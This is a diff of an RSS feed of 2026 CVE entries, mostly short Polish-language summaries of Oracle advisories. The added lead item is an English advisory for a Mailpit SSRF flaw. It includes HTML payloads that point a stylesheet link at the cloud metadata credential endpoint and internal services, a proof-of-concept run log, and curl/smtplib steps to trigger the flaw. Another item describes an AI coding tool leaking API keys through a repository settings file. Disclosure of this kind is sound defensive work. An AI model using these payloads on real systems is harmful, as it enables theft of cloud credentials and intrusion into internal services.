@@ -1,5 +1,240 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-0933</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0933</link><pubDate>Tue, 20 Jan 2026 22:58:05 +0000</pubDate><description>Podsumowanie W poleceniu `wrangler Pages Deploy` stwierdzono lukę w zabezpieczeniach umożliwiającą wstrzykiwanie poleceń (CWE-78).Problem występuje, ponieważ parametr `--commit-hash` jest przekazywany bezpośrednio do polecenia powłoki bez odpowiedniej weryfikacji lub oczyszczenia, umożliwiając osobie atakującej mającej kontrolę nad `--commit-hash` wykonanie dowolnych poleceń w systemie, na którym działa Wrangler.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-23845</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23845</link><pubDate>Wed, 21 Jan 2026 01:01:26 +0000</pubDate><description>### Server-Side Request Forgery (SSRF) via HTML Check CSS Download
+
+The HTML Check feature (`/api/v1/message/{ID}/html-check`) is designed to analyze HTML emails for compatibility. During this process, the `inlineRemoteCSS()` function automatically downloads CSS files from external `&lt;link rel="stylesheet" href="..."&gt;` tags to inline them for testing. 
+
+
+#### Affected Components
+
+- **Primary File:** `internal/htmlcheck/css.go` (lines 132-207)
+- **API Endpoint:** `/api/v1/message/{ID}/html-check`
+- **Handler:** `server/apiv1/other.go` (lines 38-75)
+- **Vulnerable Functions:**
+  - `inlineRemoteCSS()` - line 132
+  - `downloadToBytes()` - line 193
+  - `isURL()` - line 221
+
+#### Technical Details
+
+**1. Insufficient URL Validation (`isURL()` function):**
+
+```go
+// internal/htmlcheck/css.go:221-224
+func isURL(str string) bool {
+    u, err := url.Parse(str)
+    return err == nil &amp;&amp; (u.Scheme == "http" || u.Scheme == "https") &amp;&amp; u.Host != ""
+}
+```
+
+
+**2. Unrestricted Download (`downloadToBytes()` function):**
+
+```go
+// internal/htmlcheck/css.go:193-207
+func downloadToBytes(url string) ([]byte, error) {
+    client := http.Client{
+        Timeout: 5 * time.Second,
+    }
+
+    // Get the link response data
+    resp, err := client.Get(url)  // ⚠️ VULNERABLE - No IP validation
+    if err != nil {
+        return nil, err
+    }
+    defer func() { _ = resp.Body.Close() }()
+
+    if resp.StatusCode != 200 {
+        err := fmt.Errorf("error downloading %s", url)
+        return nil, err
+    }
+
+    body, err := io.ReadAll(resp.Body)  // ⚠️ Downloads ENTIRE response
+    if err != nil {
+        return nil, err
+    }
+
+    return body, nil
+}
+```
+
+**3. Automatic CSS Processing:**
+
+```go
+// internal/htmlcheck/css.go:132-187
+func inlineRemoteCSS(h string) (string, error) {
+    reader := strings.NewReader(h)
+    doc, err := goquery.NewDocumentFromReader(reader)
+    if err != nil {
+        return h, err
+    }
+
+    remoteCSS := doc.Find("link[rel=\"stylesheet\"]").Nodes
+    for _, link := range remoteCSS {
+        attributes := link.Attr
+        for _, a := range attributes {
+            if a.Key == "href" {
+                if !isURL(a.Val) {  // ⚠️ Insufficient validation
+                    continue
+                }
+
+                if config.BlockRemoteCSSAndFonts {
+                    logger.Log().Debugf("[html-check] skip testing remote CSS content: %s (--block-remote-css-and-fonts)", a.Val)
+                    return h, nil
+                }
+
+                resp, err := downloadToBytes(a.Val)  // ⚠️ Downloads from ANY URL
+                if err != nil {
+                    logger.Log().Warnf("[html-check] failed to download %s", a.Val)
+                    continue
+                }
+
+                // Inlines the downloaded CSS
+                styleBlock := &amp;html.Node{
+                    Type:     html.ElementNode,
+                    Data:     "style",
+                    DataAtom: atom.Style,
+                }
+                styleBlock.AppendChild(&amp;html.Node{
+                    Type: html.TextNode,
+                    Data: string(resp),  // Downloaded content inserted
+                })
+                link.Parent.AppendChild(styleBlock)
+            }
+        }
+    }
+    
+    return doc.Html()
+}
+```
+
+
+#### Attack Vectors
+
+**Attack Vector 1: Cloud Metadata Credential Theft**
+
+Attacker sends HTML email with:
+```html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"&gt;
+&lt;/head&gt;
+&lt;body&gt;Legitimate email content&lt;/body&gt;
+&lt;/html&gt;
+```
+
+When HTML check is triggered:
+1. Mailpit makes GET request to AWS metadata endpoint
+2. Downloads IAM credentials as "CSS content"
+3. Credentials logged or potentially leaked via error messages
+
+
+
+#### Proof of Concept
+
+A complete working exploit is provided in `ssrf_htmlcheck_poc.py`.
+
+**PoC Usage:**
+
+```bash
+# Ensure Mailpit is running
+# SMTP: localhost:1025
+# HTTP API: localhost:8025
+
+# Run the exploit
+python3 ssrf_htmlcheck_poc.py
+```
+
+**PoC Workflow:**
+
+1. **Starts SSRF listener** on port 8888 to detect callbacks
+2. **Sends malicious HTML emails** containing:
+   ```html
+   &lt;link rel="stylesheet" href="http://localhost:8888/malicious.css"&gt;
+   &lt;link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/"&gt;
+   &lt;link rel="stylesheet" href="http://127.0.0.1:6379/"&gt;
+   ```
+3. **Triggers HTML check** via API: `GET /api/v1/message/{ID}/html-check`
+4. **Monitors callbacks** and analyzes responses
+5. **Demonstrates exploitation** of:
+   - Local listener (proves SSRF)
+   - Cloud metadata endpoints
+   - Internal services (Redis, etc.)
+   - Private network ranges
+
+**Expected Output:**
+
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║  Mailpit SSRF PoC - HTML Check CSS Download Vulnerability                   ║
+║  Severity: MODERATE                                                              ║
+║  File: internal/htmlcheck/css.go:193-207                                    ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+[+] SSRF listener started on port 8888
+[*] Testing SSRF with callback to local listener...
+
+================================================================================
+[*] Testing SSRF with target: http://localhost:8888/malicious.css
+================================================================================
+[+] Email sent with CSS link to: http://localhost:8888/malicious.css
+[+] Message ID: abc123xyz
+[*] Triggering HTML check: http://localhost:8025/api/v1/message/abc123xyz/html-check
+[+] HTML check completed (Status: 200)
+
+[SSRF-LISTENER] 127.0.0.1 - "GET /malicious.css HTTP/1.1" 200 -
+
+[+] SUCCESS! SSRF confirmed - Received 1 callback(s):
+    Path: /malicious.css
+    User-Agent: Mailpit/dev
+
+================================================================================
+[*] Testing SSRF against internal/private targets...
+================================================================================
+
+⚠️  Note: These may timeout or fail, but Mailpit WILL attempt the connection
+
+[+] Email sent with CSS link to: http://127.0.0.1:6379/
+[+] Message ID: def456uvw
+[*] Triggering HTML check: http://localhost:8025/api/v1/message/def456uvw/html-check
+[!] Request timed out - target may be blocking or slow
+```
+
+**Manual Testing:**
+
+```bash
+# 1. Send malicious email
+cat &lt;&lt; 'EOF' | python3 - &lt;&lt;SENDMAIL
+import smtplib
+from email.mime.text import MIMEText
+
+html = '''
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/"&gt;
+&lt;/head&gt;
+&lt;body&gt;Test&lt;/body&gt;
+&lt;/html&gt;
+'''
+
+msg = MIMEText(html, 'html')
+msg['Subject'] = 'SSRF Test'
+msg['From'] = 'test@test.com'
+msg['To'] = 'victim@test.com'
+
+with smtplib.SMTP('localhost', 1025) as smtp:
+    smtp.send_message(msg)
+SENDMAIL
+EOF
+
+# 2. Get message ID
+MESSAGE_ID=$(curl -s http://localhost:8025/api/v1/messages?limit=1 | jq -r '.messages[0].ID')
+
+# 3. Trigger SSRF
+curl -v "http://localhost:8025/api/v1/message/$MESSAGE_ID/html-check"</description></item><item><title>CVE-2026-21852</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21852</link><pubDate>Wed, 21 Jan 2026 01:00:31 +0000</pubDate><description>Luka w przepływie ładowania projektu Claude Code umożliwiła złośliwym repozytoriam eksfiltrację danych, w tym kluczy Anthropic API, zanim użytkownicy potwierdzili zaufanie.Jeśli użytkownik uruchomił Claude Code w repozytorium kontrolera atakującego, a repozytorium zawierało plik ustawień, który ustawia ANTHROPIC_BASE_URL na punkt końcowy kontrolowany przez osobę atakującą, Claude Code wysyłałby żądania API przed wyświetleniem monitu o zaufanie, co mogłoby skutkować potencjalnym wyciekiem kluczy API użytkownika.
+
+Użytkownicy standardowej automatycznej aktualizacji Claude Code otrzymali już tę poprawkę.Użytkownikom dokonującym aktualizacji ręcznych zaleca się aktualizację do najnowszej wersji.</description></item><item><title>CVE-2026-21980</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21980</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Life Sciences Central Coding aplikacji Oracle Health Sciences (komponent: Platforma).Obsługiwana wersja, której to dotyczy, to 7.0.1.0.Łatwa do wykorzystania luka umożliwia nieuwierzytelnionemu atakującemu z dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń Oracle Life Sciences Central Coding.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowaną aktualizacją, wstawieniem lub usunięciem dostępu do niektórych danych dostępnych w Oracle Life Sciences Central Coding, a także nieautoryzowanym dostępem do odczytu podzbioru danych dostępnych w Oracle Life Sciences Central Coding.Wynik podstawowy CVSS 3.1 6,5 (wpływ na poufność i uczciwość).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N).</description></item><item><title>CVE-2026-21975</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21975</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w komponencie Java VM serwera bazy danych Oracle.Obsługiwane wersje, których to dotyczy, to 19.3–19.29 i 21.3–21.20.Łatwa do wykorzystania luka umożliwia atakującemu o wysokich uprawnieniach, posiadającemu uprawnienia uwierzytelnionego użytkownika z dostępem do sieci za pośrednictwem Oracle Net, złamanie zabezpieczeń maszyny wirtualnej Java.Skuteczne ataki wymagają interakcji ze strony osoby innej niż atakujący.Skuteczne ataki z wykorzystaniem tej luki mogą skutkować nieautoryzowaną możliwością spowodowania zawieszenia lub często powtarzającej się awarii (cały DOS) maszyny wirtualnej Java.Wynik podstawowy CVSS 3.1 4,5 (wpływ na dostępność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:N/A:H).</description></item><item><title>CVE-2026-21976</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21976</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Business Intelligence Enterprise Edition firmy Oracle Analytics (komponent: Oracle Analytics Cloud).Obsługiwane wersje, których to dotyczy, to 7.6.0.0.0 i 8.2.0.0.0.Łatwa do wykorzystania luka umożliwia atakującemu z niskimi uprawnieniami po zalogowaniu się do infrastruktury, w której działa Oracle Business Intelligence Enterprise Edition, w celu złamania zabezpieczeń Oracle Business Intelligence Enterprise Edition.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym utworzeniem, usunięciem lub modyfikacją dostępu do danych krytycznych lub wszystkich danych dostępnych w Oracle Business Intelligence Enterprise Edition, a także nieautoryzowanym dostępem do danych krytycznych lub całkowitym dostępem do wszystkich dostępnych danych Oracle Business Intelligence Enterprise Edition.Wynik podstawowy CVSS 3.1 7.1 (wpływ na poufność i uczciwość).Wektor CVSS: (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N).</description></item><item><title>CVE-2026-21974</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21974</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Life Sciences Central Designer aplikacji Oracle Health Sciences (komponent: Platforma).Obsługiwana wersja, której to dotyczy, to 7.0.1.0.Łatwa do wykorzystania luka umożliwia nieuwierzytelnionemu atakującemu z dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń Oracle Life Sciences Central Designer.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do odczytu podzbioru dostępnych danych Oracle Life Sciences Central Designer.Wynik podstawowy CVSS 3.1 5.3 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).</description></item><item><title>CVE-2026-21971</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21971</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie PeopleSoft Enterprise SCM Purchasing firmy Oracle PeopleSoft (komponent: Purchasing).Obsługiwana wersja, której to dotyczy, to 9.2.Łatwa do wykorzystania luka umożliwia atakującemu z niskimi uprawnieniami i dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń PeopleSoft Enterprise SCM Purchasing.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowaną aktualizacją, wstawieniem lub usunięciem dostępu do niektórych dostępnych danych PeopleSoft Enterprise SCM Purchasing, a także nieautoryzowanym dostępem do odczytu podzbioru dostępnych danych PeopleSoft Enterprise SCM Purchasing.CVSS 3.1 Wynik podstawowy 5.4 (wpływ na poufność i uczciwość).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N).</description></item><item><title>CVE-2026-21960</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21960</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Applications DBA pakietu Oracle E-Business Suite (komponent: Java utils).Obsługiwane wersje, których to dotyczy, to 12.2.3–12.2.15.Łatwa do wykorzystania luka umożliwia osobie atakującej o wysokich uprawnieniach z dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń bazy danych Oracle Applications.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym utworzeniem, usunięciem lub modyfikacją dostępu do krytycznych danych lub wszystkich danych dostępnych w Oracle Applications DBA, a także nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich dostępnych danych Oracle Applications DBA.Wynik podstawowy CVSS 3.1 6,5 (wpływ na poufność i uczciwość).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N).</description></item><item><title>CVE-2026-21970</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21970</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Life Sciences Central Designer aplikacji Oracle Health Sciences (komponent: Platforma).Obsługiwana wersja, której to dotyczy, to 7.0.1.0.Łatwa do wykorzystania luka umożliwia atakującemu z niskimi uprawnieniami i dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń Oracle Life Sciences Central Designer.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich dostępnych danych Oracle Life Sciences Central Designer.Wynik podstawowy CVSS 3.1 6,5 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).</description></item><item><title>CVE-2026-21956</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21956</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle VM VirtualBox firmy Oracle Virtualization (komponent: Core).Obsługiwane wersje, których to dotyczy, to 7.1.14 i 7.2.4.Łatwa do wykorzystania luka umożliwia atakującemu z wysokimi uprawnieniami, logującym się do infrastruktury, w której działa Oracle VM VirtualBox, w celu złamania zabezpieczeń Oracle VM VirtualBox.Chociaż luka występuje w Oracle VM VirtualBox, ataki mogą znacząco wpłynąć na dodatkowe produkty (zmiana zakresu).Skuteczne ataki z wykorzystaniem tej luki mogą skutkować przejęciem Oracle VM VirtualBox.Wynik podstawowy CVSS 3.1 8.2 (wpływ na poufność, integralność i dostępność).Wektor CVSS: (CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H).</description></item><item><title>CVE-2026-21989</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21989</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle VM VirtualBox firmy Oracle Virtualization (komponent: Core).Obsługiwane wersje, których to dotyczy, to 7.1.14 i 7.2.4.Łatwa do wykorzystania luka umożliwia atakującemu z wysokimi uprawnieniami, logującym się do infrastruktury, w której działa Oracle VM VirtualBox, w celu złamania zabezpieczeń Oracle VM VirtualBox.Chociaż luka występuje w Oracle VM VirtualBox, ataki mogą znacząco wpłynąć na dodatkowe produkty (zmiana zakresu).Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym utworzeniem, usunięciem lub modyfikacją dostępu do krytycznych danych lub wszystkich dostępnych danych Oracle VM VirtualBox, a także nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich dostępnych danych Oracle VM VirtualBox i nieautoryzowaną możliwością spowodowania częściowej odmowy usługi (częściowej DOS) Oracle VM VirtualBox.Wynik podstawowy CVSS 3.1 8.1 (wpływ na poufność, integralność i dostępność).Wektor CVSS: (CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:L).</description></item><item><title>CVE-2026-21952</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21952</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie MySQL Server firmy Oracle MySQL (komponent: Serwer: Parser).Obsługiwane wersje, których to dotyczy, to 9.0.0–9.5.0.Łatwa do wykorzystania luka umożliwia atakującemu o wysokich uprawnieniach z dostępem do sieci za pośrednictwem wielu protokołów złamanie zabezpieczeń serwera MySQL.Skuteczne ataki z wykorzystaniem tej luki mogą skutkować nieautoryzowaną możliwością spowodowania zawieszenia lub często powtarzającej się awarii (cały DOS) serwera MySQL.Wynik podstawowy CVSS 3.1 4,9 (wpływ na dostępność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).</description></item><item><title>CVE-2026-21945</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21945</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Podatność w produkcie Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition produktu Oracle Java SE (komponent: Security).Obsługiwane wersje, których to dotyczy, to Oracle Java SE: 8u471, 8u471-b50, 8u471-perf, 11.0.29, 17.0.17, 21.0.9, 25.0.1;Oracle GraalVM dla JDK: 17.0.17 i 21.0.9;Oracle GraalVM Enterprise Edition: 21.3.16.Łatwa do wykorzystania luka umożliwia nieuwierzytelnionemu atakującemu z dostępem do sieci za pośrednictwem wielu protokołów złamanie zabezpieczeń Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.Skuteczne ataki z wykorzystaniem tej luki mogą skutkować nieuprawnioną możliwością spowodowania zawieszenia lub często powtarzającej się awarii (kompletny DOS) Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.Uwaga: ta luka dotyczy wdrożeń języka Java, zwykle na klientach uruchamiających aplikacje Java Web Start w trybie piaskownicy lub aplety języka Java w trybie piaskownicy, które ładują i uruchamiają niezaufany kod (np. kod pochodzący z Internetu) i ze względów bezpieczeństwa korzystają z piaskownicy Java.Ta luka nie dotyczy wdrożeń Java, zwykle na serwerach, które ładują i uruchamiają tylko zaufany kod (np. kod zainstalowany przez administratora).Wynik podstawowy CVSS 3.1 7,5 (wpływ na dostępność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).</description></item><item><title>CVE-2026-21961</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21961</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie PeopleSoft Enterprise HCM Human Resources firmy Oracle PeopleSoft (komponent: Company Dir / Org Chart Viewer, Employee Snapshot).Obsługiwana wersja, której to dotyczy, to 9.2.Łatwa do wykorzystania luka umożliwia nieuwierzytelnionemu atakującemu z dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń PeopleSoft Enterprise HCM Human Resources.Skuteczne ataki wymagają interakcji człowieka ze strony osoby innej niż atakujący i chociaż luka występuje w PeopleSoft Enterprise HCM Human Resources, ataki mogą znacząco wpłynąć na dodatkowe produkty (zmiana zakresu).Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowaną aktualizacją, wstawieniem lub usunięciem dostępu do niektórych dostępnych danych PeopleSoft Enterprise HCM Human Resources, a także nieautoryzowanym dostępem do odczytu podzbioru dostępnych danych PeopleSoft Enterprise HCM Human Resources.CVSS 3.1 Wynik podstawowy 6.1 (wpływ na poufność i uczciwość).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N).</description></item><item><title>CVE-2026-21944</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21944</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w Oracle Agile Product Lifecycle Management dla produktu procesowego Oracle Supply Chain (komponent: Product Quality Management).Obsługiwana wersja, której to dotyczy, to 6.2.4.Łatwa do wykorzystania luka umożliwia atakującemu z niskimi uprawnieniami i dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń Oracle Agile Product Lifecycle Management for Process.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich danych dostępnych dla procesów Oracle Agile Product Lifecycle Management.Wynik podstawowy CVSS 3.1 6,5 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).</description></item><item><title>CVE-2026-21986</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21986</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle VM VirtualBox firmy Oracle Virtualization (komponent: Core).Obsługiwane wersje, których to dotyczy, to 7.1.14 i 7.2.4.Łatwa do wykorzystania luka umożliwia nieuwierzytelnionemu atakującemu po zalogowaniu się do infrastruktury, w której działa Oracle VM VirtualBox, złamanie zabezpieczeń Oracle VM VirtualBox.Chociaż luka występuje w Oracle VM VirtualBox, ataki mogą znacząco wpłynąć na dodatkowe produkty (zmiana zakresu).Skuteczne ataki z wykorzystaniem tej luki mogą skutkować nieautoryzowaną możliwością spowodowania zawieszenia lub często powtarzającej się awarii (cały DOS) Oracle VM VirtualBox.Uwaga: ta luka dotyczy wyłącznie maszyn wirtualnych z systemem Windows.Wynik podstawowy CVSS 3.1 7.1 (wpływ na dostępność).Wektor CVSS: (CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H).</description></item><item><title>CVE-2026-21959</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21959</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Workflow pakietu Oracle E-Business Suite (komponent: Workflow Loader).Obsługiwane wersje, których to dotyczy, to 12.2.3–12.2.15.Łatwa do wykorzystania luka umożliwia osobie atakującej z wysokimi uprawnieniami, mającej dostęp do sieci za pośrednictwem protokołu HTTP, złamanie zabezpieczeń Oracle Workflow.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich dostępnych danych Oracle Workflow.Wynik podstawowy CVSS 3.1 4,9 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N).</description></item><item><title>CVE-2026-21948</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21948</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie MySQL Server firmy Oracle MySQL (komponent: Serwer: Optymalizator).Obsługiwane wersje, których to dotyczy, to 8.0.0–8.0.44, 8.4.0–8.4.7 i 9.0.0–9.5.0.Łatwa do wykorzystania luka umożliwia atakującemu o wysokich uprawnieniach z dostępem do sieci za pośrednictwem wielu protokołów złamanie zabezpieczeń serwera MySQL.Skuteczne ataki z wykorzystaniem tej luki mogą skutkować nieautoryzowaną możliwością spowodowania zawieszenia lub często powtarzającej się awarii (cały DOS) serwera MySQL.Wynik podstawowy CVSS 3.1 4,9 (wpływ na dostępność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).</description></item><item><title>CVE-2026-21963</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21963</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle VM VirtualBox firmy Oracle Virtualization (komponent: Core).Obsługiwane wersje, których to dotyczy, to 7.1.14 i 7.2.4.Łatwa do wykorzystania luka umożliwia atakującemu z wysokimi uprawnieniami, logującym się do infrastruktury, w której działa Oracle VM VirtualBox, w celu złamania zabezpieczeń Oracle VM VirtualBox.Chociaż luka występuje w Oracle VM VirtualBox, ataki mogą znacząco wpłynąć na dodatkowe produkty (zmiana zakresu).Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich dostępnych danych Oracle VM VirtualBox.Wynik podstawowy CVSS 3.1 6,0 (wpływ na poufność).Wektor CVSS: (CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N).</description></item><item><title>CVE-2026-21966</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21966</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Hospitality OPERA 5 Property Services pakietu Oracle Hospitality Applications (komponent: Opera).Obsługiwane wersje, których to dotyczy, to 5.6.19.23, 5.6.25.17, 5.6.26.10 i 5.6.27.4.Łatwa do wykorzystania luka umożliwia nieuwierzytelnionemu atakującemu z dostępem do sieci za pośrednictwem protokołu HTTP złamanie zabezpieczeń usług Oracle Hospitality OPERA 5 Property Services.Skuteczne ataki wymagają interakcji człowieka ze strony osoby innej niż atakujący i chociaż luka dotyczy Oracle Hospitality OPERA 5 Property Services, ataki mogą znacząco wpłynąć na dodatkowe produkty (zmiana zakresu).Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowaną aktualizacją, wstawieniem lub usunięciem dostępu do niektórych danych dostępnych w Oracle Hospitality OPERA 5 Property Services, a także nieautoryzowanym dostępem do odczytu podzbioru danych dostępnych w Oracle Hospitality OPERA 5 Property Services.CVSS 3.1 Wynik podstawowy 6.1 (wpływ na poufność i uczciwość).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N).</description></item><item><title>CVE-2026-21967</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21967</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie Oracle Hospitality OPERA 5 pakietu Oracle Hospitality Applications (komponent: Opera Servlet).Obsługiwane wersje, których to dotyczy, to 5.6.19.23, 5.6.25.17, 5.6.26.10 i 5.6.27.4.Łatwa do wykorzystania luka pozwala nieuwierzytelnionemu atakującemu z dostępem do sieci za pośrednictwem protokołu HTTP naruszyć bezpieczeństwo Oracle Hospitality OPERA 5. Skuteczne ataki z wykorzystaniem tej luki mogą skutkować nieautoryzowanym dostępem do krytycznych danych lub całkowitym dostępem do wszystkich danych dostępnych Oracle Hospitality OPERA 5, a także nieautoryzowaną aktualizacją, wstawianiem lub usuwaniem dostępu do niektórych dostępnych danych Oracle Hospitality OPERA 5 oraz nieautoryzowaną możliwością spowodowania częściowej odmowy usługi (częściowej DOS) Oracle Hospitality OPERA 5. CVSS 3.1 BaseWynik 8,6 (wpływ na poufność, integralność i dostępność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L).</description></item><item><title>CVE-2026-21964</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21964</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie MySQL Server firmy Oracle MySQL (komponent: Serwer: Thread Pooling).Obsługiwane wersje, których to dotyczy, to 8.0.0–8.0.44, 8.4.0–8.4.7 i 9.0.0–9.5.0.Łatwa do wykorzystania luka umożliwia atakującemu o wysokich uprawnieniach z dostępem do sieci za pośrednictwem wielu protokołów złamanie zabezpieczeń serwera MySQL.Skuteczne ataki z wykorzystaniem tej luki mogą skutkować nieautoryzowaną możliwością spowodowania zawieszenia lub często powtarzającej się awarii (cały DOS) serwera MySQL.Wynik podstawowy CVSS 3.1 4,9 (wpływ na dostępność).Wektor CVSS: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).</description></item><item><title>CVE-2026-21965</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21965</link><pubDate>Wed, 21 Jan 2026 00:31:43 +0000</pubDate><description>Luka w produkcie MySQL Server firmy Oracle MySQL (komponent: Serwer: Pluggable Auth).Obsługiwane wersje, których to dotyczy, to 9.0.0–9.5.0.Łatwa do wykorzystania luka umożliwia atakującemu o wysokich uprawnieniach z dostępem do sieci za pośrednictwem wielu protokołów złamanie zabezpieczeń serwera MySQL.Skuteczne ataki wykorzystujące tę lukę mogą skutkować nieautoryzowaną możliwością spowodowania częściowej odmowy usługi (częściowej zmiany systemu DOS) serwera MySQL.Wynik podstawowy CVSS 3.1 2.7 (wpływ na dostępność).Wektor CVSS: 